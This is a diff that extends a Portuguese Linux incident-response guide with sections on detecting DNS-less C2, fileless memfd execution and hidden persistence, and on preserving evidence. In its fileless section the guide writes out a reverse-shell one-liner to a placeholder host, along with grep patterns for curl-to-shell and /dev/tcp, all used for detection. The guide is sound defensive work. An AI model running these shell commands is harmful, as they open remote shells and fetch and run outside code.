@@ -32,6 +32,7 @@
   - [3.13. Buscar processos por nome](#313-buscar-processos-por-nome)
   - [3.14. Executáveis deletados ainda em execução](#314-executáveis-deletados-ainda-em-execução)
   - [3.15. Namespaces (esconderijo sem container)](#315-namespaces-esconderijo-sem-container)
+  - [3.16. Fileless: o binário que nunca tocou o disco](#316-fileless-o-binário-que-nunca-tocou-o-disco)
 - [4. Checklist rápido de processo](#4-checklist-rápido-de-processo)
 - [5. Arquivo/binário](#5-arquivobinário)
   - [5.1. Metadata](#51-metadata)
@@ -495,7 +496,41 @@ sudo conntrack -L 2>/dev/null | grep -vE 'ESTABLISHED|127\.0\.0\.1'   # conexõe
 sudo journalctl -u systemd-resolved --since '2 hours ago' 2>/dev/null | grep -i query
 ```
 
-> `TIME_WAIT` estende sua janela em até ~60 s: o `ss` que perdeu o beacon ainda pode pegar o rastro dele. E o **DNS é o elo mais visível de todos** — a conexão dura 200 ms, mas a resolução do mesmo domínio acontece a cada beacon e fica no log do resolver e no do servidor DNS, onde ninguém a apaga.
+> `TIME_WAIT` estende sua janela em até ~60 s: o `ss` que perdeu o beacon ainda pode pegar o rastro dele.
+
+> **DNS só ajuda se houver domínio — e três condições.** A resolução deixa rastro no resolver local e no servidor DNS, onde o atacante do host não apaga; mas isso exige que o implante use **nome** (não IP fixo), que o **TTL** seja menor que o intervalo do beacon (senão o cache responde e não há consulta nova) e que ele não resolva por **DoH/DoT**, que passa por fora do resolver local. Com IP fixo compilado no binário (§5.5), não existe consulta nenhuma — e essa via não serve.
+
+> **A inversão é o sinal mais forte:** tráfego legítimo quase sempre passa por nome. Uma conexão de saída para IP público **sem resolução DNS anterior** é, por si, anomalia — e é uma hipótese de caça melhor do que procurar o domínio (§40.2). Vale para os dois casos: com domínio você acha a consulta; com IP fixo você acha a ausência dela.
+
+Capturar as duas coisas na mesma janela e tirar a diferença:
+
+```bash
+sudo timeout 300 tcpdump -ni any -w "$IR/dns-conn.pcap" \
+  'port 53 or (tcp[tcpflags] & (tcp-syn|tcp-ack) == tcp-syn)'
+# IPs que o DNS entregou
+tshark -r "$IR/dns-conn.pcap" -Y dns.a -T fields -e dns.a | tr ',' '\n' | sort -u > /tmp/resolvidos
+# IPs para os quais o host abriu conexão
+tshark -r "$IR/dns-conn.pcap" -Y 'tcp.flags.syn==1 && tcp.flags.ack==0' \
+  -T fields -e ip.dst | sort -u > /tmp/destinos
+# contatados SEM terem sido resolvidos
+comm -13 /tmp/resolvidos /tmp/destinos \
+  | grep -vE '^(10\.|127\.|169\.254\.|192\.168\.|172\.(1[6-9]|2[0-9]|3[01])\.)'
+```
+
+```bash
+sudo gethostlatency-bpfcc          # quem resolve o quê, com PID e nome consultado (§32)
+sudo strings -a "$FILE" | grep -oE '\b([0-9]{1,3}\.){3}[0-9]{1,3}\b' | sort -u   # IP literal no binário (§5.5)
+```
+
+> **Como ler a diferença:** o que sobra são destinos contatados por IP puro. Há legítimo aí — NTP, metadata, espelho de pacote fixado, agente de monitoração — e há o falso positivo estrutural: **processo que resolveu antes da sua captura começar e usou o cache**. Por isso confira o `etime` do dono do socket (§3.1): processo antigo pode ter resolvido há horas; processo que **nasceu dentro da sua janela** e nunca consultou DNS não tem essa desculpa.
+
+> **`gethostlatency` fecha o outro lado:** ele lista os processos que **chamam** o resolvedor. Um processo que abre conexões de saída e nunca aparece nessa lista está usando IP fixo — que é exatamente o perfil do implante compilado com o C2 dentro (§5.5, §5.10).
+
+> **DoH é o caso especial:** se o implante resolve por DNS-over-HTTPS, a consulta vira uma conexão TLS comum e a diferença acima **acusa corretamente** — só que o destino será um resolvedor conhecido. Conexão para `1.1.1.1`, `8.8.8.8` ou `9.9.9.9` a partir de um processo que não é browser nem o resolvedor do sistema é achado, não ruído.
+
+```bash
+sudo ss -tnp | grep -E '1\.1\.1\.1|1\.0\.0\.1|8\.8\.(8\.8|4\.4)|9\.9\.9\.9'
+```
 
 ### Acumular: repita a pergunta
 
@@ -560,7 +595,7 @@ systemctl list-timers --all                                      # OnUnitActiveS
 ```text
 VPC Flow Logs / netflow   registra TODO fluxo, curto ou longo — e entrega a periodicidade pronta
 log do proxy / NAT        mesmo efeito, com o destino
-DNS central               a consulta periódica ao mesmo domínio, mesmo com conexão curtíssima
+DNS central               a consulta periódica ao mesmo domínio — se o C2 usar nome (ver acima)
 ```
 
 > Mesmo argumento da §0 e da §10.4: o host só responde sobre o instante em que você perguntou; a rede registra o intervalo inteiro sem você pedir nada.
@@ -670,6 +705,15 @@ Locais especialmente suspeitos:
 diretórios temporários em NFS
 ```
 
+> **Por que o cwd importa além de "lugar suspeito":** é onde o processo resolve **caminhos relativos** — um implante com cwd no diretório de upload da app está a um `open("x")` de ler e escrever ali. E, na prática, o cwd costuma ser o diretório de onde ele foi **executado**: um cwd dentro do docroot ou da pasta de uploads entrega o vetor sem você precisar chegar na §16.
+
+```text
+cwd = /                        daemon bem comportado faz chdir("/") — normal, ignore
+cwd '(deleted)'                o diretório de trabalho foi apagado: rastro sendo limpo
+cwd em upload/dados da app     o vetor, de graça (§16)
+cwd em /tmp, /dev/shm, ~/.cache  §8
+```
+
 ---
 
 ## 3.5. Command line real
@@ -678,6 +722,16 @@ diretórios temporários em NFS
 sudo sh -c "tr '\0' ' ' < /proc/$PID/cmdline"
 echo
 ```
+
+```text
+cmdline VAZIO e /proc/<pid>/exe existe   thread de KERNEL não tem 'exe'. Processo de userspace
+                                         com cmdline vazio está se disfarçando de uma (§31)
+argv[0] != basename do exe               'exec -a': renomeado no momento do exec (§7.1)
+linha truncada no 'ps'                   o /proc devolve inteira; o 'ps' corta na largura
+senha/token como argumento               /proc/*/cmdline é legível por QUALQUER usuário do host
+```
+
+> **Para que serve, e para que não serve:** `cmdline` é a mesma fonte que o `ps` lê, e o processo pode reescrevê-la. Ela mostra o **disfarce** — não confirma identidade. Confirmação é o `exe` (§3.3).
 
 ---
 
@@ -696,6 +750,26 @@ sudo sh -c "tr '\0' '\n' < /proc/$PID/environ" \
 ```
 
 > `environ` pode conter senhas, tokens, URLs privadas e chaves.
+
+> **O achado que quase ninguém usa: o ambiente identifica QUEM lançou o processo.** O `environ` é fixado no `exec` e não muda depois — é uma fotografia do contexto de lançamento, e cada lançador deixa uma assinatura diferente:
+
+```text
+SSH_CONNECTION / SSH_CLIENT / SSH_TTY   nasceu de sessão SSH interativa — e o valor de
+                                        SSH_CONNECTION contém o IP DE ORIGEM do atacante (§12)
+INVOCATION_ID / JOURNAL_STREAM          foi lançado pelo systemd → existe uma unit (§7.2)
+PATH mínimo, sem SSH_*, sem TERM        cara de cron (§7.1)
+mesmo environ do processo da app        nasceu de dentro da app: RCE (§16)
+LD_PRELOAD definido                     rootkit de userland (§7.8)
+```
+
+```bash
+sudo sh -c "tr '\0' '\n' < /proc/$PID/environ" | grep -E 'SSH_|INVOCATION_ID|JOURNAL_STREAM|LD_'
+# compare com o processo do serviço, para ver se o filho herdou o ambiente do pai
+sudo sh -c "tr '\0' '\n' < /proc/<PID_DO_SERVICO>/environ" | sort > /tmp/a
+sudo sh -c "tr '\0' '\n' < /proc/$PID/environ" | sort | diff /tmp/a - | head
+```
+
+> Quando o `pstree` já perdeu o pai (`PPid 1`, §3.2), o `environ` e o cgroup (§3.11) são as duas vias que ainda restauram a origem.
 
 ---
 
@@ -761,6 +835,8 @@ Somente rede:
 sudo lsof -Pan -a -p "$PID" -i
 ```
 
+> A §3.8 lista os fds crus; aqui o `lsof` os **traduz** — tipo, tamanho, caminho do arquivo, endereço do socket. Três linhas valem o comando: arquivo aberto em diretório de dados da app (leitura em massa = §37), biblioteca carregada de fora de `/usr/lib` (§7.8), e `IPv4 ... ESTABLISHED` para endereço público — a linha que amarra este processo ao C2 da §2.
+
 ---
 
 ## 3.10. Maps e memória mapeada
@@ -769,17 +845,25 @@ sudo lsof -Pan -a -p "$PID" -i
 sudo cat /proc/$PID/maps
 ```
 
-Filtrar caminhos:
+O que procurar (colunas: `endereço perms offset dev inode caminho`):
 
 ```bash
-sudo grep '/' /proc/$PID/maps
+sudo grep 'rwx' /proc/$PID/maps                       # gravável E executável ao mesmo tempo
+sudo grep '(deleted)' /proc/$PID/maps                 # binário/lib apagados do disco (§3.14)
+sudo awk '$6 ~ /\// && $6 !~ /^\/(usr|lib|lib64|etc)/ {print $6}' /proc/$PID/maps | sort -u
 ```
 
-Útil para encontrar:
+```text
+rwxp                     o processo pode escrever código e executá-lo. NORMAL em runtime com
+                         JIT (Java, Node, .NET); ANORMAL em binário C/Go simples
+executável e ANÔNIMO     região sem arquivo nenhum por trás: código que nunca existiu em disco
+(sem path)               — é a assinatura de injeção (o que o 'malfind' do Volatility procura, §32)
+(deleted)                o arquivo mapeado não existe mais (§3.14)
+path em /tmp, /dev/shm,
+home ou fora de /usr/lib lib carregada de onde ninguém instala = hijack ou preload (§7.8)
+```
 
-* bibliotecas injetadas;
-* executáveis deletados;
-* arquivos carregados fora de `/usr/lib*`.
+> `MemoryDenyWriteExecute=yes` (§34.1) é exatamente o controle que torna a primeira linha impossível — por isso ele quebra packer e injeção de código.
 
 ---
 
@@ -787,15 +871,19 @@ sudo grep '/' /proc/$PID/maps
 
 ```bash
 sudo cat /proc/$PID/cgroup
+sudo systemctl status "$PID"          # em systemd, resolve direto para a unit
 ```
 
-Em systemd:
+Como ler a linha:
 
-```bash
-sudo systemctl status "$PID"
+```text
+0::/system.slice/nginx.service          serviço do sistema → a unit é o nome antes de '.service'
+0::/user.slice/user-1000.slice/session-3.scope   nasceu de uma SESSÃO de login (§12)
+0::/system.slice/docker-<ID>.scope       veio de um container → §38.1
+0::/kubepods/burstable/pod<UID>/...      veio de um pod → §38.2
 ```
 
-Pode revelar diretamente qual service unit iniciou o processo.
+> **É o que restaura o pai quando `PPid=1`.** Daemonizar (duplo fork) faz o processo perder o pai, mas **não** o tira do cgroup: ele continua registrando de qual unit, sessão ou container aquilo saiu. Quando o `pstree` (§3.2) termina em `systemd` e não diz nada, é aqui — e no `environ` (§3.6) — que a origem reaparece.
 
 ---
 
@@ -813,6 +901,8 @@ pid,ppid,user,lstart,etime,stat,args \
 | grep '<USER>'
 ```
 
+> **A lógica:** comprometido um processo, o atacante herda o alcance daquele **usuário** — e raramente deixa só um. Este comando revela o irmão que você não estava procurando. Ordene mentalmente pelo `lstart`: os que nasceram na mesma janela do artefato (§9) provavelmente são a mesma operação; um `etime` muito maior que o dos outros é candidato a ter sido o primeiro.
+
 ---
 
 ## 3.13. Buscar processos por nome
@@ -826,6 +916,10 @@ Por usuário:
 ```bash
 pgrep -a -u <USER> '<NOME>'
 ```
+
+> `pgrep -a` casa contra a **cmdline inteira**, não só o nome — então acha `bash -c 'curl ... | sh'`, que um `pgrep bash` puro perderia.
+
+> **E o limite:** se o processo foi renomeado (`exec -a`, §7.1) ou se disfarça de thread de kernel, procurar por nome não acha **nada** — e o vazio parece limpeza. Nesse caso a entrada é outra: a conexão (§2), o arquivo no filesystem (§8) ou o que executa sozinho (§7).
 
 ---
 
@@ -857,6 +951,8 @@ Recupere o binário apagado direto do `/proc` (o link `exe` continua válido):
 sudo cp /proc/$PID/exe "$IR/samples/recovered.bin"
 ```
 
+> Um passo além disso: o binário que **nunca** esteve em disco (`memfd`) — §3.16.
+
 ---
 
 ## 3.15. Namespaces (esconderijo sem container)
@@ -874,9 +970,70 @@ sudo nsenter -t "$PID" -a ls -la /         # entra no namespace dele e olha de d
 
 ---
 
+## 3.16. Fileless: o binário que nunca tocou o disco
+
+A §3.14 trata do arquivo apagado **depois** de executar. Aqui é o passo seguinte: o arquivo **nunca existiu**. Não há o que o `find` encontre (§8), o que o `sha256sum` calcule (§5.4) nem o que o `rpm -Va` compare (§24) — e o resultado vazio dessas seções **não significa nada**.
+
+As formas, e o rastro de cada uma:
+
+```text
+memfd_create + fexecve   ELF escrito num arquivo ANÔNIMO em RAM e executado dali
+                         → /proc/<pid>/exe aponta para /memfd:<nome> (deleted)
+interpretador em pipe    curl|bash, base64 -d|sh, python -c, perl -e
+                         → só a cmdline (§3.5); em disco, nada
+built-in do shell        bash -i >& /dev/tcp/IP/PORTA 0>&1 — nem binário externo existe
+                         → cmdline + fd apontando para socket (§3.8)
+injeção em processo vivo ptrace, ou escrita em /proc/<pid>/mem
+                         → TracerPid != 0 (§3.7) e região anônima rwx (§3.10)
+tmpfs                    /dev/shm, /run — o arquivo existe, mas em RAM: some no reboot
+eBPF                     sem módulo e sem arquivo (§35.4)
+```
+
+```bash
+# 1) memfd — o mais direto, e o que quase ninguém procura
+sudo ls -l /proc/*/exe 2>/dev/null | grep -i memfd
+sudo grep -l memfd /proc/*/maps 2>/dev/null
+
+# 2) todo 'exe' que aponta para algo inexistente (cobre memfd E apagado)
+for p in /proc/[0-9]*; do
+  e=$(sudo readlink "$p/exe" 2>/dev/null) || continue
+  case "$e" in *'(deleted)'*|/memfd:*) echo "$p -> $e";; esac
+done
+
+# 3) interpretador consumindo código de fora
+sudo ps -eo pid,user,args \
+  | grep -EI 'curl.*\|.*(ba)?sh|base64 -d|python[0-9.]* -c|perl -e|/dev/tcp/' | grep -v grep
+
+# 4) executável em tmpfs (existe agora, some no reboot)
+findmnt -nt tmpfs -o TARGET | while read -r m; do sudo find "$m" -type f -perm /111 2>/dev/null; done
+```
+
+> **`/memfd:` no `exe` é praticamente conclusivo.** Processo legítimo quase nunca executa a partir de memória anônima — as exceções são poucas e conhecidas (alguns runtimes e empacotadores). Se o `readlink` devolve `/memfd:algo (deleted)`, há execução fileless e o binário **existe apenas dentro daquele processo**.
+
+> **Consequência direta para a coleta:** matar o processo (§20) destrói a única cópia que existe. `cp /proc/<pid>/exe` continua funcionando — o kernel mantém o inode anônimo enquanto o processo viver — e o `gcore` pega a memória. Isto vem **antes** de qualquer outra coisa (§6, §29):
+
+```bash
+sudo cp /proc/$PID/exe "$IR/samples/fileless-$PID.bin"
+sudo gcore -o "$IR/samples/fileless-$PID.core" "$PID"
+```
+
+> **E a persistência não é fileless.** Payload em memória morre no reboot: para voltar, ele precisa de um gatilho — e o gatilho está em disco (§7) ou no metadata da cloud (§7.12). Se você achou execução fileless e **nenhuma** persistência, procure de novo: ou o gatilho existe e passou, ou o atacante está reexplorando o vetor (§16) a cada vez. As duas hipóteses mudam o que fazer.
+
+---
+
 # 4. Checklist rápido de processo
 
 > **Por quê:** roda de uma vez a identidade completa de um PID suspeito. **Olhe para:** exe/cwd/cmdline incoerentes com o nome exibido, fds de socket/PTY, arquivo deletado ainda aberto.
+
+**O bloco responde cinco perguntas, nesta ordem:**
+
+```text
+1. ele É o que diz ser?    nome no ps  x  /proc/<pid>/exe          §3.3
+2. quem o criou?           ppid, pstree, cgroup                    §3.2 §3.11
+3. com que poder roda?     Uid/Gid, CapEff                         §3.7
+4. com quem ele fala?      fd, lsof -i                             §3.8 §3.9
+5. desde quando?           lstart, etime                           §3.1
+```
 
 ```bash
 PID=<PID>
@@ -898,6 +1055,28 @@ sudo ls -la /proc/$PID/fd
 sudo lsof -Pan -p "$PID"
 sudo lsof -Pan -a -p "$PID" -i
 ```
+
+**Como ler o conjunto.** Nenhum item sozinho fecha o caso; a combinação sim:
+
+```text
+nome no ps ≠ basename do exe                 masquerading — sozinho já é forte (§3.3)
+exe em /tmp, /dev/shm, ~/.config, ~/.cache   software legítimo não mora lá (§8)
+exe marcado '(deleted)'                      executou e apagou: clássico (§3.14)
+fd 0, 1 e 2 no MESMO socket                  reverse shell, por definição (§3.8)
+socket + /dev/pts/*                          shell interativo com TTY do outro lado (§17)
+PPid=1 sem unit correspondente               daemonizou para perder o rastro (§3.11)
+CapEff != 0 num processo não-root            root disfarçado (§3.7)
+TracerPid != 0                               alguém tem ptrace nele: debug ou injeção
+etime longo num processo desconhecido        já estava aqui antes de você começar a olhar
+environ com LD_PRELOAD, GS_*, PM2_*          entrega a técnica e às vezes a família (§5.10)
+cwd em diretório de dados/upload da app      dá o vetor de graça (§16)
+```
+
+> **Dois ou três juntos dispensam a discussão.** Um processo cujo `exe` está em `~/.cache`, com `fd 0/1/2` no mesmo socket e `PPid 1`, não tem explicação inocente: trate como comprometimento confirmado e vá para a §6 (preservar) **antes** de qualquer outra coisa.
+
+> **E o contrário também informa:** `exe` dentro de `/usr/bin` com pacote correspondente (§24), `CapEff` zerado, sem socket e com `PPid` de uma unit conhecida — isso é um processo normal com nome infeliz. Descarte e siga.
+
+> **Diferença para a §29:** este bloco é para **ler na tela** e decidir. A §29 é o mesmo material para **salvar em arquivo** durante a coleta. Se o processo pode morrer a qualquer momento (ou você vai matá-lo), rode a §29 primeiro e leia depois — evidência primeiro, análise depois (§28).
 
 ---
 
@@ -933,6 +1112,22 @@ Filesystem/mount:
 ```bash
 findmnt -T "$FILE"
 ```
+
+O que cada um responde:
+
+```text
+dono/grupo   binário de sistema é root:root. Arquivo de root dentro de diretório da app —
+             ou com dono = usuário da app em /usr/local/bin — é anomalia (§14)
+modo         777/666 não sai de instalador nenhum; 4755 é SUID (§25)
+getfacl      ACL dá acesso ALÉM do que o 'ls -l' mostra; um '+' no fim do modo é a pista
+lsattr       'i' = imutável, travado contra remoção; 'a' = append-only, anti-forense (§21)
+getcap       capability no arquivo = poder de root sem SUID, e sem aparecer no find -perm (§25)
+findmnt -T   está em noexec? em FS remoto? em tmpfs (some no reboot, junto com sua evidência)?
+```
+
+> `getfacl` e `lsattr` estão aqui porque são as duas formas de esconder poder de quem lê só o modo: o `ls -l` sinaliza ACL com um `+` discreto e **não mostra nada** sobre atributos de inode.
+
+> **A combinação que fecha sozinha:** arquivo executável, dono `root:root`, morando em `/tmp` ou no home de um usuário de aplicação, com `ctime` dentro da janela do incidente (§5.2). Nenhum gerenciador de pacotes produz isso.
 
 ---
 
@@ -1088,15 +1283,25 @@ O que cada saída responde:
 
 ## 5.7. Hex
 
-```bash
-sudo xxd "$FILE" | head -50
-```
-
-ou:
+Os primeiros bytes dizem o que o arquivo **é**, independente de nome, extensão e do que o `file` reportar:
 
 ```bash
-sudo hexdump -C "$FILE" | head -50
+sudo xxd "$FILE" | head -5      # magic bytes + início do header
+sudo xxd "$FILE" | tail -20     # o FIM: payload anexado depois do código
 ```
+
+```text
+7f 45 4c 46   .ELF   executável Linux — o 5º byte: 01=32 bits, 02=64 bits
+23 21 2f      #!/    script: leia a primeira linha inteira, ela nomeia o interpretador
+55 50 58 21   UPX!   empacotado com UPX → explica o "quase nenhuma string" da §5.5
+4d 5a         MZ     executável WINDOWS num host Linux = kit genérico jogado às cegas
+1f 8b         ..     gzip: conteúdo comprimido (dropper que se extrai)
+50 4b 03 04   PK     zip/jar
+```
+
+> **Por que olhar o fim também:** anexar um payload ao final de um ELF é técnica comum — o binário roda normalmente e lê o resto de dentro de si mesmo. Se o `tail` mostrar assinatura de zip/gzip ou texto legível depois de onde o código deveria acabar, é isso; o `binwalk` (§32) confirma e extrai.
+
+> **Entropia como atalho:** se o dump aparece como bytes sem padrão nenhum do começo ao fim — sem trechos ASCII, sem regiões de zeros, sem repetição — o conteúdo está comprimido ou cifrado. Junto com a §5.5, é o diagnóstico de *packed*, e a consequência é ir para a memória (§6): no disco não há o que ler.
 
 ---
 
@@ -1104,13 +1309,19 @@ sudo hexdump -C "$FILE" | head -50
 
 ```bash
 sudo lsof "$FILE"
-```
-
-ou:
-
-```bash
 sudo fuser -v "$FILE"
 ```
+
+```text
+a coluna ACCESS do 'fuser -v' diz o TIPO de uso:
+  e  executando — este é o binário do processo      f  arquivo aberto
+  c  é o cwd do processo                            r  é a raiz (chroot) do processo
+  m  mapeado em memória (lib carregada)
+```
+
+> **Se ninguém está usando, isso é informação — não fim de linha.** Duas leituras opostas: o artefato foi dropado e **ainda não rodou** (você chegou antes; o gatilho pode estar armado — vá para a §7), ou ele **já rodou e saiu** (implante que executa e morre a cada beacon — §2.7). O `atime` (§5.2, se o mount não for `noatime`) e o audit (§11) separam as duas.
+
+> É o caminho inverso da §3.14: lá você parte do processo para achar o arquivo; aqui, do arquivo para achar o processo. Se o `lsof` não devolve nada e mesmo assim você suspeita que está rodando, o binário pode ter sido apagado com o processo vivo — aí é `lsof +L1`.
 
 ---
 
@@ -1206,25 +1417,45 @@ sudo mkdir -p "$IR/samples"
 sudo chmod 700 "$IR/samples"
 ```
 
-Copiar:
+Registre **antes** de copiar:
+
+```bash
+sudo stat "$FILE"      | sudo tee "$IR/samples/stat.txt"
+sudo sha256sum "$FILE" | sudo tee "$IR/samples/sha256.txt"
+```
+
+Só então copie, e confirme que a cópia é a mesma coisa:
 
 ```bash
 sudo cp -a "$FILE" "$IR/samples/"
+sudo sha256sum "$IR/samples/$(basename "$FILE")" | sudo tee -a "$IR/samples/sha256.txt"
 ```
 
-Metadata:
+> **A ordem não é estética.** `cp -a` preserva dono, modo, ACL, `mtime` e `atime` — mas **não há como preservar o `ctime`**: a cópia nasce com o ctime de agora. Como o `ctime` é justamente o timestamp que não se falsifica (§5.2), ele existe apenas no `stat.txt` que você gravou antes de tocar no arquivo. Invertida a ordem, a datação do artefato se perde para sempre.
+
+> **Os dois hashes iguais são a cadeia de custódia.** É o que responde, semanas depois, "isso aí é mesmo o que estava na máquina?" — e é o que se registra no war log (§39.3).
+
+Feche a coleta e tire do host:
 
 ```bash
-sudo stat "$FILE" \
-  > "$IR/samples/stat.txt"
+sudo chmod 0400 "$IR/samples/"*
+sudo tar czf "$IR.tgz" -C "$(dirname "$IR")" "$(basename "$IR")"
+sha256sum "$IR.tgz"          # anote este hash FORA do host
 ```
 
-Hash:
+> **Onde a amostra não pode ficar:** (1) no mesmo disco que o rebuild vai destruir (§27) — tire do host; (2) com bit de execução — `chmod 0400`, e renomeie para algo que ninguém clique se for circular; (3) em diretório compartilhado ou com backup/antivírus automático — o AV corporativo apaga a sua evidência, e a coleta contém `environ`, config e logs com segredo (§1).
 
-```bash
-sudo sha256sum "$FILE" \
-  > "$IR/samples/sha256.txt"
+**Além do binário, preserve o gatilho e o contexto** — eles desaparecem na §19 e na §21:
+
+```text
+a linha do cron, o arquivo da unit, a chave em authorized_keys   §7   (copie ANTES de remover)
+a saída da §29 (processo) e da §30 (arquivo)
+o core dump, se o binário for packed                             abaixo
+o pcap, se a conexão ainda estiver viva                          §2.6
+os logs do serviço na janela, antes de rotacionarem              §10
 ```
+
+> Um cron apagado sem cópia é evidência perdida **e** risco operacional: se algo quebrar depois, você não tem como saber se aquela linha era legítima (§19).
 
 ## Memória do processo (binário packed)
 
@@ -1247,11 +1478,15 @@ Procure persistência **antes de matar o processo**.
 Os gatilhos, em ordem de frequência real:
 
 ```text
-tempo    cron, systemd timer, at, anacron            §7.1 §7.2 §7.4
-boot     unit systemd, rc.local, init, módulo kernel  §7.2 §7.7 §7.12
-login    authorized_keys, .bashrc, .ssh/rc, PAM, MOTD §7.5 §7.6 §7.12
-sempre   supervisor (pm2/supervisord), container restart:always  §7.10 §7.11
-sombra   LD_PRELOAD, ld.so.preload, udev, hook de pacote        §7.8 §7.12
+tempo      cron, systemd timer, at, anacron                          §7.1 §7.2 §7.4
+boot       unit systemd, rc.local, init.d, generator, módulo kernel   §7.2 §7.7 §7.12
+login      authorized_keys, .bashrc, .ssh/rc, PAM, MOTD               §7.5 §7.6 §7.12
+conexão    unit .socket — não existe processo até alguém conectar     §7.2
+evento     unit .path, udev, hook de gerenciador de pacote            §7.2 §7.12
+sempre     supervisor (pm2/supervisord), container restart:always     §7.10 §7.11
+sombra     LD_PRELOAD, ld.so.preload, drop-in de unit, ld.so.conf.d   §7.8 §7.2
+requisição módulo do servidor web, auto_prepend_file do PHP           §7.12
+fora do SO startup-script / user-data no metadata da cloud            §7.12
 ```
 
 > **Presuma mais de um.** Operador competente deixa persistência barulhenta (que você acha) e uma silenciosa (que você não acha). Só considere limpo depois da §22 e do re-scan em 24–48h.
@@ -1358,6 +1593,28 @@ sudo grep -RInaE \
 2>/dev/null
 ```
 
+**Não são só `.service` e `.timer`:**
+
+```bash
+systemctl list-units --type=socket --all      # .socket: o systemd escuta e só ENTÃO sobe o serviço
+systemctl list-units --type=path --all        # .path: dispara quando um arquivo aparece ou muda
+systemctl list-unit-files --type=service,socket,path,timer --state=enabled
+```
+
+> **`.socket` é um backdoor sem processo.** Com ativação por socket, quem abre a porta é o **systemd**: o binário do atacante não roda, não aparece no `ps`, e o `ss -ltnp` mostra `pid=1` como dono do listener. Ele nasce quando alguém conecta e morre quando a conexão fecha. Varredura de processo não acha nada — o que acha é a lista acima e um listener cujo dono é o systemd num serviço que você não reconhece (§2.1).
+
+> **`.path` é o cron dos eventos:** dispara na criação ou modificação de um caminho. Sem horário fixo, não há periodicidade para correlacionar (§9, §2.7) — o gatilho é o próprio atacante escrevendo num arquivo.
+
+**Drop-ins e overrides** — alteram uma unit legítima sem tocar no arquivo dela:
+
+```bash
+systemctl cat <UNIT>                   # a config EFETIVA: unit original + todos os drop-ins
+sudo systemd-delta --type=extended     # tudo que sobrescreve ou estende algo do sistema
+sudo find /etc/systemd/system -path '*.d/*' -name '*.conf' -newerct "$D" 2>/dev/null
+```
+
+> Um `ExecStartPre=` num drop-in de serviço legítimo é persistência quase perfeita: o serviço continua com o mesmo nome, o mesmo arquivo `.service` intacto, e roda o payload antes de subir. **Ler o `.service` não mostra isso** — só `systemctl cat` mostra.
+
 ---
 
 # 7.3. Systemd de usuário
@@ -1381,14 +1638,16 @@ sudo -iu <USER> systemctl --user list-units --type=service
 # 7.4. `at`
 
 ```bash
-atq
+atq                      # só os SEUS jobs
+sudo atq                 # os de root
+sudo ls -la /var/spool/cron/atjobs /var/spool/at 2>/dev/null    # todos, de todos os usuários
+sudo at -c <ID>          # o CONTEÚDO do job
+systemctl is-active atd  # sem o atd rodando, nada dispara
 ```
 
-Root:
+> **É o gatilho que mais escapa, e por um motivo específico: ele dispara UMA vez, no futuro.** Não é recorrente, então não aparece em nenhuma varredura de "o que roda periodicamente" — e é exatamente assim que um atacante sobrevive à sua limpeza: agenda um job para daqui a seis horas, você limpa tudo, valida na §22, e ele volta de madrugada. Depois de limpar, `atq` é obrigatório.
 
-```bash
-sudo atq
-```
+> **Bônus do `at -c`:** o job guarda o **ambiente inteiro** de quem o criou, no momento da criação. Vale a leitura da §3.6 — `SSH_CONNECTION` ali dentro entrega o IP de origem de quem agendou.
 
 ---
 
@@ -1458,6 +1717,34 @@ sudo grep -RInaE \
 2>/dev/null
 ```
 
+**Qual arquivo roda quando** — é isto que decide qual deles o atacante escolhe:
+
+```text
+shell de LOGIN            /etc/profile → ~/.bash_profile ou ~/.profile
+shell INTERATIVO          /etc/bash.bashrc → ~/.bashrc      ← o favorito: roda a CADA login SSH
+shell NÃO interativo      $BASH_ENV (se definido)            ← roda em script, cron, scp
+ao sair                   ~/.bash_logout
+zsh                       ~/.zshenv roda SEMPRE, inclusive não interativo  ← o mais forte
+qualquer usuário          /etc/profile.d/*.sh — um arquivo ali vale para TODO mundo
+```
+
+```bash
+grep -rn 'BASH_ENV' /etc /home 2>/dev/null       # o caminho que quase ninguém confere
+sudo ls -la /etc/profile.d/                       # arquivo recente aqui atinge todos os usuários
+```
+
+> **Onde olhar dentro do arquivo:** no **fim**. `.bashrc` de distro tem dezenas de linhas e ninguém rola até o final — acrescentar lá embaixo, depois de um bloco de linhas em branco, é o padrão. `tail -20` em cada um vale mais que o `grep` acima.
+
+> **O baseline sai de graça:** os arquivos de esqueleto em `/etc/skel` são a versão original que a distro copiou para cada home. Um `diff` mostra tudo que foi acrescentado desde então, sem você precisar de baseline nenhuma.
+
+```bash
+for f in .bashrc .profile .bash_profile; do
+  for h in /home/*/; do
+    [ -f "$h$f" ] && { echo "== $h$f"; diff "/etc/skel/$f" "$h$f" 2>/dev/null | head -20; }
+  done
+done
+```
+
 ---
 
 # 7.7. rc.local / init scripts
@@ -1476,6 +1763,16 @@ sudo grep -RInaE \
 /etc/rc.local \
 2>/dev/null
 ```
+
+```bash
+sudo ls -la /etc/rc.local /etc/rc.d/rc.local 2>/dev/null   # PRECISA ser executável para rodar
+systemctl status rc-local 2>/dev/null                       # a unit que ainda o executa no boot
+sudo stat -c '%n %z' /etc/rc.local /etc/init.d/* 2>/dev/null | sort -k2   # ctime na janela? (§9)
+```
+
+> **Por que continua valendo em 2026:** `rc.local` é legado do SysV, mas as distros mantêm um `rc-local.service` que o executa no boot **se o arquivo existir e tiver bit de execução**. É persistência de root, no boot, num arquivo que a maioria dos times nunca abre porque "ninguém usa mais isso". O mesmo vale para `/etc/init.d/`: scripts ali ainda são convertidos em unit pelo `systemd-sysv-generator` e não aparecem em `/etc/systemd/system` (§7.2).
+
+> Detalhe que decide: um `rc.local` **sem** bit de execução é inerte. Se você encontrar um com `chmod +x` recente (§5.2), o `ctime` data a ativação.
 
 ---
 
@@ -1505,6 +1802,15 @@ ls /proc/*/exe 2>/dev/null | wc -l ; ps -e | wc -l      # divergência = process
 ```
 
 > Binário **estático** (`file` diz `statically linked`) e `busybox` ignoram o preload — por isso servem de "segunda opinião" num host suspeito. Se `ls` e `busybox ls` discordam sobre o mesmo diretório, você tem rootkit.
+
+Duas primas do preload — mesma família, o processo carrega código de onde o atacante escreve:
+
+```bash
+sudo cat /etc/ld.so.conf /etc/ld.so.conf.d/*.conf 2>/dev/null   # diretório gravável na busca de libs
+grep -rn 'LD_PRELOAD\|LD_LIBRARY_PATH' /etc/environment /etc/security/pam_env.conf 2>/dev/null
+```
+
+> `/etc/environment` e o `pam_env` são lidos pelo PAM em **toda sessão**: definir `LD_PRELOAD` ali tem o efeito do `ld.so.preload`, num arquivo que ninguém associa a execução de código. E um diretório gravável em `ld.so.conf.d` é a versão persistente do mesmo truque — a rota de privesc da §36.4 vista como persistência.
 
 ---
 
